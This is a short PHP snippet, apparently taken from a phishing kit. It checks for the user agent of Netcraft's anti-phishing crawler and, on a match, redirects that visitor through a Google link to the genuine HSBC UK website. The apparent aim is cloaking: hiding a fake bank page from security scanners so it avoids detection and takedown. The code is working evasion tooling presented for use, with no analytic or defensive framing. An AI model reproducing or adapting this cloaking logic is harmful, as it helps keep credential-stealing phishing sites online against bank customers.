<?php

# Netcraft HTTP agent deny snippet

if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {

        header("Location: https://www.google.ie/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwjl7oHQx6fLAhUBvRoKHUIGAvkQFggbMAA&url=https%3A%2F%2Fwww.hsbc.co.uk%2F&usg=AFQjCNHgssL48GufX82hDefuAgLxFpYtvg&bvm=bv.115339255,d.d2s");
		die();

}

?>